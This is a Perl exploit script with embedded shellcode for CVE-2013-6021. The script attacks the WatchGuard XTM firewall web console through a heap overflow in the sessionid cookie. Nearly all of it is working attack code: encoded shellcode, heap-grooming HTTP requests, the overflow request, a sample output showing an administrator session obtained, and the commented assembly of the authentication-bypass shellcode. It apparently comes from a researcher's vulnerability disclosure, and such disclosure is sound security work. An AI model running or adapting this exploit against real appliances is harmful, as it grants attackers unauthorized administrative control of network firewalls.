#!/usr/bin/perl -w
=header
*********************************************************************
**  WatchGuard Firewall XTM version 11.7.4u1                       **
**  Remote buffer overflow exploit ~ sessionid cookie              **
*********************************************************************
**                                                                 **
**            Author:  jerome.nokin@gmail.com                      **
**              Blog:  http://funoverip.net                        **
**               CVE:  CVE-2013-6021                               **
**                                                                 **
*********************************************************************
**                                                                 **
**  - Bug, exploit & shellcode details available on:               **
**    http://funoverip.net/?p=1519                                 **
**                                                                 **
**  - Decoded shellocde can be found at the end of this file       **
**                                                                 **
*********************************************************************
=cut


=output sample

[*] Sending HTTP ping request to https://192.168.60.200:8080 : OK. Got 'pong'
[*] Checking sessionid cookie for bad chars
[*] Checking shellcode for bad chars
[*] Heap messaging (request 1) : ...
[*] Sending authentication bypass shellcode (request 2)
[*] HTTP Response : 

--------------------------------------------------------------------------------
HTTP/1.1 200 OK
Content-type: text/xml
Set-Cookie: sessionid=6B8B4567327B23C6643C98696633487300000014
Date: Sun, 27 Oct 2013 21:11:38 GMT
Server: none
Content-Length: 751

<?xml version="1.0"?>
<methodResponse>
  <params>
    <param>
      <value>
        <struct>
          <member><name>sid</name><value>6B8B4567327B23C6643C98696633487300000014</value></member>
          <member><name>response</name><value></value></member>
          <member>
            <name>readwrite</name>
            <value><struct>
              <member><name>privilege</name><value>2</value></member>
              <member><name>peer_sid</name><value>0</value></member>
              <member><name>peer_name</name><value>error</value></member>
              <member><name>peer_ip</name><value>0.0.0.0</value></member>
            </struct></value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodResponse>
--------------------------------------------------------------------------------

[*] Over.
=cut

use warnings;
use strict;
use IO::Socket::SSL;

# host and port of the XTM web console
my $host = "192.168.60.200";
my $port = "8080";

# Shellcode (watch out bad chars)
my $shellcode = 
  # shellcode: bypass password verification and return a session cookie
  "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIMQJdYHfas030mQ" .
  "KusPQWVoEPLKK5wtKOKOkOnkMM4HkO9okOoOePXpwuuXOsJgs4LMbWUTk1KNs04PUX" .
  "eXD4tKTyvgQeZNGIaOgtptC78kM7X8VXGK6fWxnmPGL0MkzTKoVegxmYneidKNKOkO" .
  "9WK5HxkNYoyoUPuP7pGpNkCpvlk9k5UPIoKO9oLKnmL4KNyoKOlKk5qx9nioioLKNu" .
  "RLKNioYoMY3ttdc4NipTq4VhMYTL14NazLxPERuP30oqzMn0G54OuPmkXtyOeUtHlK" .
  "sevhnkRrc8HGW47TeTwpuPEPgpNi4TwTMnNpZyuTgxKOn6K90ELPNkQU7xLKg0r4oy" .
  "ctQ45TlMK35EISKOYoMYWt14MnppMfUTWxYohVk3KpuWMY0Empkw0ENXwtgpuPC0lK" .
  "benpLKSpF0IWPDQ4Fh30s0Wp5PlMmCrMo3KO9olIpTUts4nic44dMnqnyPUTTHKOn6" .
  "LIbeLXSVIW0EMvVb5PKw3uNt7pgpWpuPiWpEnluPWpwpGpOO0KzN34S8kOm7A";

# Shellocde max length
my $shellcode_max_len = 2000;


# set our shellcode address into EAX (expected by alpha2 encoder)
my $alpha2_ecx24 =
        "\x8b\x41\x24" .        # mov    eax, [ecx+0x24]
        "\x29\xd0" .            # sub    eax, edx ; (edx is updated by nopsled)
        "\x83\xc0\x40" .        # add    eax, 0x40
        "\x83\xe8\x35";    # sub    eax, 0x35
        # for the reader, "add eax, edx" contains bad chars. 
  # This is the reason why the nopsled decrement EDX and that we use "dec eax, edx"


# flush after every write
$| = 1;

# HTTP POST data for authentication request
my $login_post_data =
"<methodCall><methodName>login</methodName><params><param><value><struct><member>" .
"<name>password</name><value><string>foo</string></value></member><member>" .
"<name>user</name><value><string>admin</string></value></member></struct></value>" .
"</param></params></methodCall>";

# list of bad characters
my @badchars = (
  "\x00",
        "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x0a",
        "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10", "\x11", "\x12", "\x13",
        "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c",
        "\x1d", "\x1e", "\x1f",
        "\x20", "\x22", "\x26", "\x27", "\x3b" # cookie delimiters
);


# function: Check input for badchars.
sub check_badchars {
  my $in = shift;
  my $stop = 0;
  for(my $i=0; $i<length($in); $i++){
    my $c = substr($in,$i,1);
    if($c ~~ @badchars){
      printf " - bad char '0x%02x' found\n", ord($c);
      $stop = 1;
    }
  }
  if($stop){ exit; }
}

# function: testing remote connectivity with the appliance
# send HTTP "ping" request and expect "pong" reply
sub testing_connectivity {

  print "[*] Sending HTTP ping request to https://$host:$port : ";
        my $sock = IO::Socket::SSL->new( PeerHost => "$host", PeerPort => "$port") or die "SSL: $!";

        if($sock){
    my $req = 
      "GET /ping HTTP/1.0\r\n" .
      "Host:$host:$port"  . "\r\n" .
      "\r\n";    

    # send ping
    print $sock $req;
    my $resp='';
    my $pong = 0;
    # read answer
    while (my $line = <$sock>){
      if($line =~ /pong/) { $pong = 1;}
      $resp .= $line;
    }
    # got pong ?
    if($pong){
      print "OK. Got 'pong'\n";
    }else{
      print "ERROR. Expecting 'pong' response but received :\n";
      print $resp;
      exit;
    }
                close $sock;
        }else{
                print "ERROR: Socket failed !\n";
                exit;
        }
}


# function: HTTP request used for HEAP messaging phase
sub building_request_step1 {
  my $sessionid = "A" x 120; # do not overflow now
        my $req =
                "POST /agent/ping HTTP/1.1\r\n" .
                "Host:$host:$port"  . "\r\n" .
                "User-Agent: " . "a" x 100 . "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0  " . "a" x 100  . "\r\n" .
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8, " . "a" x 992 . "\r\n" .
                "Accept-Language: en-gb,en;q=0.5" . "a" x 200 . "\r\n" .
                "Cookie: sessionid=" . $sessionid . "\r\n" .
    "Accept-Charset: utf-8\r\n" .
    "Content-Type: application/xml\r\n" .
                "Content-Length: 3\r\n" .
                "\r\n" .
                "foo" ;
  return $req;
}

# function: HTTP request used for buffer overflow exploitation
sub building_request_step2 {

  my $sessionid = 
    "A" x 140 .   # junk
    "\x44\x85" ;    # off by 2 overflow to reach  0x8068544  (on the heap).
        # 0x8068544 contains a "good memory chunk" which satisfy all rules

  print "[*] Checking sessionid cookie for bad chars\n";
  check_badchars($sessionid);

        my $req =
                "POST /agent/ping HTTP/1.1\r\n" .
                "Host:$host:$port"  . "\r\n" .
                "User-Agent: " . "a" x 1879  . "\r\n" .
                "Connection: keep-alive"  . "a" x 22 . 
        "\x4a" x ($shellcode_max_len - length($shellcode) - length($alpha2_ecx24))  .  # nops
        $alpha2_ecx24 . # set EAX to shellcode addr
        $shellcode .  # shellcode
        "\r\n" .
    "Accept-Encoding: identity," . "b" x 1386 . "\r\n" .
                "Cookie: sessionid=" . $sessionid . "\r\n" .
    "Accept-Charset: utf-8\r\n" .
    "Content-Type: application/xml\r\n" .
                "Content-Length: " . length($login_post_data). "\r\n" .
                "\r\n" .
                $login_post_data ;

  return $req;
}

# function: Send an HTTP request.
sub send_http_request {

  my $req = shift;
  my $read_answer = shift || 0;
  my $http_resp='';

  # Open socket
  my $sock = IO::Socket::SSL->new( PeerHost => "$host", PeerPort => "$port") or die "SSL: $!";

  if($sock){
                print $sock $req;

    # do we need the answer ?
    if ($read_answer){
      my $is_chunked = 0;
      my $is_body = 0;
                  while(my $line = <$sock>){

        if($line =~ /Transfer-Encoding: chunked/){
          $is_chunked = 1;
          next;
        }
        
        if($line eq "\r\n"){ 
          # we reached the body 
          if($is_chunked){
            $line = <$sock>; # chunk length
            $line =~ s/\r\n//g;
            $sock->read(my $data, hex($line)); # read chunk
            $http_resp .= sprintf "Content-Length: %d\r\n\r\n", hex($line);
            $http_resp .= $data;
            close $sock ;
            return $http_resp;
          }
        }
        
        $http_resp .= $line;
      }
    }
                close $sock;
  }else{
          print "ERROR: Socket failed !\n";
          exit;
  }
  return $http_resp;
}



### MAIN ####


# print banner
print << 'EOF';
**********************************************************
**  WatchGuard Firewall XTM version 11.7.4u1            **
**  Remote buffer overflow exploit ~ sessionid cookie   **
**********************************************************
**                                                      **
**  Author:  jerome.nokin@gmail.com                     **
**    Blog:  http://funoverip.net                       **
**     CVE:  CVE-2013-6021                              **
**                                                      **
**********************************************************
**                                                      **
**  Bug, exploit & shellcode details available on:      **
**  http://funoverip.net/?p=1519                        **
**                                                      **
**********************************************************

EOF


# Send an HTTP ping request
testing_connectivity();

# building HTTP requests
my $request_step1 = building_request_step1();
my $request_step2 = building_request_step2();

# Testing shellcode against bad cahrs
print "[*] Checking shellcode for bad chars\n";
check_badchars($shellcode);

# Fillin the heap
print "[*] Heap messaging (request 1) : ";
for(my $i=0 ; $i<3 ; $i++){
  send_http_request($request_step1);
  print ".";
}
print "\n";

# Exploiting
print "[*] Sending authentication bypass shellcode (request 2)\n";
my $resp = send_http_request($request_step2,1);
print "[*] HTTP Response : \n\n";

print "-" x 80 . "\n";
print $resp;
print "-" x 80 . "\n\n";


print "[*] Over.\n";
exit;


=shellcode
;------------------------------------------------
; shellcode-get-gession.asm  
; by Jerome Nokin for XTM(v) 11.7.4 update 1
;------------------------------------------------

global _start
_start:


  ; current EBP/ESP values
  ;-------
  ; esp            0x3ff0b518    
  ; ebp            0x3ff0b558    


  ; first, fix the stack in HTTP_handle_request function
  ; -------
  ; esp           0x3ff0b6f0  
  ; ebp           0x3ffffcb8  

  ; we'll do
  ;---------
  ;$ perl -e 'printf "%x\n", 0x3ff0b518 + 472'
  ; 3ff0b6f0
  ; ESP = ESP + 472
  ;$ perl -e 'printf "%x\n", 0x3ff0b558 + 1001312'
  ; 3ffffcb8
  ; EBP = EBP + 1001312

  ; fix ESP/EBP
  add   esp, 472
  add   ebp, 1001312


  ; fixing overwritten ptrs


  ; finding initial malloc pointer v50 (overwritten)
  ; 0805f000-08081000 rwxp 00000000 00:00 0          [heap]

  ; v54 and v55 have not been overwritten and contain *(v50+0x10) and *(v50+0x14)

  ; example inside gdb
  ;b *0x8051901
  ;b *0x80519c0
  ;(gdb) x/xw $ebp-0xf8    <===== v55
  ;0x3ffffbc0:  0x08065b90
  ;(gdb) x/xw $ebp-0xfc           <===== v54                            
  ;0x3ffffbbc:  0x08067fe0
  ;(gdb) find /w 0x08060000, 0x0806ffff, 0x08067fe0, 0x08065b90  <==== search seq on heap
  ;0x8063b48
  ;1 pattern found.
  ;(gdb) x/xw 0x8063b48-0x10  <==== initial malloc ptr (v50) is at 0x8063b48-0x10
  ;0x8063b38:  0x00000001

  ; search this sequence on the heap
  mov  eax, [ebp-0xfc]  ; v54
  mov  ebx, [ebp-0xf8]  ; v55

  mov  edi, 0x0805f000    ; heap start addr
loop:
  add  edi, 4
  lea  esi, [edi+4]
  cmp     esi, 0x08081000    ; edi is out of the heap ?
  je  loop_end
  cmp  [edi], eax    ; cmp v54
  jne  loop
  cmp     [edi+4], ebx    ; cmp v55
  je  found
  jmp  loop
  
loop_end:
  mov  eax, 0x08063b38    ; default value (should not be reached)

found:
  lea  eax, [edi-0x10]    ; eax = v50 address (malloc ptr addr)
  
        ; EBP-0x10c 
        ; saved content of v50 (malloc) = ebp-0x10c 
        mov     [ebp-0x10c], eax

        ; reset EBX (see following)
        ; 805185c:       e8 95 43 00 00          call   8055bf6 <wga_signal+0x784>
        ; 8051861:       81 c3 93 c7 00 00       add    ebx,0xc793
        ; ....
        ; 8055bf6:       8b 1c 24                mov    ebx,DWORD PTR [esp]
        ; 8055bf9:       c3                      ret    
        mov     ebx, 0x805dff4

  ; EBP-0x108
  ; just reset it to 0
  mov     dword [ebp-0x108], 0x0
  
  ; EBP-0x100
  ;  80519b1:       8b 40 0c                mov    eax,DWORD PTR [eax+0xc]
  ;  80519b4:       89 85 00 ff ff ff       mov    DWORD PTR [ebp-0x100],eax
  mov  eax, [eax+0xc]
  mov  [ebp-0x100], eax


  ; simulate call to login function. copy args
  mov  ecx, [ebp-0x10c]
  mov  eax, [ebp-0x198]
  mov  edx, [ebp-0x194]
  mov  [esp+0x4],eax
  mov  [esp+0x8],edx
  mov  [esp],ecx


  ; Now setup the login function stack

  ; current esp/ebp
  ; ----------------
        ; esp           0x3ff0b6f0      
        ; ebp           0x3ffffcb8 

  ; we want to land into the login function
  ; ---------------------------------------
  ; esp            0x3ff0b420
  ; ebp            0x3ff0b6e8

  ; we'll do
  ;---------
  ; $ perl -e ' printf "%x\n", 0x3ff0b6f0 - 720'
  ; 3ff0b420
  ; ESP = ESP - 720
  ; $ perl -e ' printf "%x\n", 0x3ffffcb8 - 1000912'
  ; 3ff0b6e8
  ; EBP = EBP - 1000912

  ; stack fix
  sub   esp, 720
  sub   ebp, 1000912


  ; EBX -> .GOT (same as above btw)
  mov  ebx, 0x805dff4


        ; simulate "decode HTTP content" fct, at top of the login function
        mov     edx, [ebp+0x8]
        mov     edx, [edx+0x8]
        mov     dword [esp+0x4], 0x0            ; no content_encoding header
        mov     [esp], edx
        mov     esi, 0x0804d990
        call    esi                             ; decode content
        mov     [ebp-0x70],eax                  ; int decoded_content; // [sp+258h] [bp-70h]@1


  ; simulate "search remote_address"
  mov  eax, [ebp+0x8]
  mov  eax, [eax+0x14]
  mov  [esp+0x4],eax
  lea  eax,[ebx-0x3ceb]
  mov  [esp],eax
  mov  esi, 0x804b670       ;FCGX_GetParam
  call  esi
  add  eax, 0x7      ; remove '::ffff:'  ====> to improve
  mov  [ebp-0x60],  eax


  ; is_admin = 4
  mov  dword [ebp-0x48], 0x4


  ; simulate "search req_user value"
  mov  eax, [ebp-0x70]
  mov      eax, [eax+0x50]
  mov  dword [esp+0x8],0x0
  lea  edx,[ebx-0x3c93]
  mov  [esp+0x4],edx
  mov  [esp],eax  
  mov  esi, 0x804c07e
  call  esi        ; <FCGX_PutStr@plt+0x3de>
  mov  [ebp-0x68],eax


  ; v49 = 2 (ipv4)
  mov  word [ebp-0x5a], 0x2     ; unsigned __int16 v49; // [sp+26Eh] [bp-5Ah]@1

  ; challenge
  mov  dword [ebp-0x6c], 0x0    ; const char *req_challenge; // [sp+25Ch] [bp-6Ch]@1

  ; set v43 to null
  mov  dword [ebp-0x74], 0x0     ;int v43; // [sp+254h] [bp-74h]@1


  ; ok, we are ready to jump in the middle of the "login" function
  ; right after the password verification

  ; jump here
  ; 804ee4b:       c7 44 24 04 00 12 00    mov    DWORD PTR [esp+0x4],0x1200
  ; 804ee52:       00 
  ; 804ee53:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
  ; 804ee5a:       e8 11 c4 ff ff          call   804b270 <calloc@plt>

  mov  edi, 0x804ee4b
  jmp  edi
=cut
